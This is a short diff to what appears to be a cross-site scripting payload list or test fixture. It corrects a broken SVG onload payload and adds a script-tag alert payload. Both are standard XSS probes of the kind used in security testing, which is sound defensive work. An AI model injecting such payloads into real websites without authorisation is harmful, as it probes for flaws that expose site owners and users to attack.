@@ -1,1 +1,2 @@
-<svg onload=alert(document.location>
+<svg onload=alert(document.location)>
+<script>alert(1)</script>
